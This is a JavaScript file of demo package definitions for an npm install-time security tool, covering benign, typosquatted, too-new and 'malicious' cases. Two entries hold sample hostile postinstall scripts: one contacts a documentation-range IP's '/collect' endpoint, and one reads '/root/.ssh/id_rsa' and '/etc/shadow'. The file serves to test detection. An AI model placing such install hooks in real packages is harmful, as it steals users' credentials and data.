// Demo package definitions — the cast for `node demo/run.mjs`.
//
// SAFETY: every "malicious" package here is harmless. The exfil targets are
// IPs from RFC 5737 TEST-NET (203.0.113.0/24) and RFC 3849 documentation
// ranges — globally unroutable, they go nowhere. And the box runs with
// --network none regardless, so even a real address could not be reached.
// These packages demonstrate INTENT detection; nothing ever leaves a machine.
//
// Each entry documents its expected outcome so the runner can assert the
// demo still behaves as advertised (a demo that silently rots is worse than
// no demo). See demo/README.md for the narrative.

/**
 * @typedef {Object} DemoPackage
 * @property {string} name
 * @property {string} version
 * @property {number} ageDays - publish age fed to the cooldown filter
 * @property {Object<string,string>} [scripts] - lifecycle scripts
 * @property {Object<string,string>} [files] - extra files in the tarball
 * @property {'installs'|'blocked'|'convicted'} expect - headline outcome
 * @property {string} title - one-line demo caption
 * @property {string} why - what this package teaches
 */

/** A postinstall that writes a marker, so "did it run" is observable on disk. */
const markRan = `require('fs').writeFileSync(require('path').join(__dirname,'marker.txt'),'ran');`;

/** @type {DemoPackage[]} */
export const DEMO_PACKAGES = [
  // ── True negatives: benign, installs cleanly ────────────────────────────
  {
    name: 'demo-plain',
    version: '1.0.0',
    ageDays: 120,
    expect: 'installs',
    title: 'Ordinary pure-JS package',
    why: 'No install scripts at all (~90% of real packages). Filtered for cooldown, installed, never prompts. The quiet baseline.',
  },

  // ── False-positive RESISTANCE: looks scary, is fine, must NOT convict ────
  {
    name: 'demo-native-build',
    version: '1.0.0',
    ageDays: 120,
    scripts: { postinstall: 'node build.js' },
    files: {
      // A realistic native-module build: spawns a compiler-like child,
      // reads its OWN package config, writes build output into its dir.
      // Every one of these is a thing real build scripts (node-gyp,
      // esbuild, sharp) legitimately do — guard must pass it.
      'build.js': [
        `const fs = require('fs'), path = require('path');`,
        `const cp = require('child_process');`,
        `// reads its own .npmrc (npm config) — looks like 'secret access' but isn't`,
        `try { fs.readFileSync(path.join(__dirname, '.npmrc')); } catch {}`,
        `// spawns a child like a compiler would`,
        `cp.execSync('node -e "0"');`,
        `// writes build output into its own dir (the only writable mount)`,
        `fs.writeFileSync(path.join(__dirname, 'build', 'addon.node'), 'fake-binary');`,
        markRan,
      ].join('\n'),
      '.npmrc': 'loglevel=warn\n',
      'build/.keep': '',
    },
    expect: 'installs',
    why: 'THE false-positive test. Spawns a child process, reads a config file, writes binaries — the static scan FLAGS all three, yet the syscall trace shows no reach-out and no real-secret access, so the box passes it. Proves guard distinguishes "build-shaped" from "malicious".',
  },

  // ── True positives: convicted by the syscall trace ──────────────────────
  {
    name: 'demo-exfil',
    version: '1.0.0',
    ageDays: 120,
    scripts: { postinstall: 'node steal.js' },
    files: {
      'steal.js': [
        markRan, // prove it ran before conviction
        `// Attempt to phone home to a DOCUMENTATION IP (RFC 5737, unroutable).`,
        `require('http').get('http://203.0.113.66:8080/collect').on('error', () => {});`,
        `setTimeout(() => process.exit(0), 500);`,
      ].join('\n'),
    },
    expect: 'convicted',
    why: 'Classic install-time exfil. The box has no network so the connect() FAILS, but strace captures the attempt + destination. Output discarded, approval auto-revoked, install fails. The headline demo.',
  },
  {
    name: 'demo-snoop',
    version: '1.0.0',
    ageDays: 120,
    scripts: { postinstall: 'node snoop.js' },
    files: {
      'snoop.js': [
        markRan,
        `// Reach for SSH keys that don't exist in the box — the ATTEMPT convicts.`,
        `try { require('fs').readFileSync('/root/.ssh/id_rsa'); } catch {}`,
        `try { require('fs').readFileSync('/etc/shadow'); } catch {}`,
        `setTimeout(() => process.exit(0), 300);`,
      ].join('\n'),
    },
    expect: 'convicted',
    why: 'Credential theft. The box mounts no secrets, so the reads return ENOENT — but reaching for /root/.ssh and /etc/shadow has no build-time excuse, so the openat() syscalls convict.',
  },

  // ── Policy layer: blocked before it ever runs ───────────────────────────
  {
    name: 'demo-too-fresh',
    version: '9.9.9',
    ageDays: 1,
    expect: 'blocked',
    title: 'Brand-new version inside the cooldown',
    why: 'Published 1 day ago. The proxy hides it from npm entirely — most malware is caught and yanked within days, so the cooldown stops it before any code is fetched or run. Defense before detection.',
  },
  {
    // One transposition from "lodash" — the proxy's name gate empties every
    // version so npm can't resolve it. Caught on the NAME, before any metadata
    // about a specific version even matters.
    name: 'lodahs',
    version: '1.0.0',
    ageDays: 120,
    expect: 'blocked',
    title: 'Typosquat of a popular package (lodash → lodahs)',
    why: 'A fat-finger/autocomplete attack. depguard recognizes the name is one edit from "lodash", blocks every version fail-closed, and tells you to allowlist it in .guardrc if it was somehow intentional. Pure name-level defense — no version is ever fetched.',
  },
];
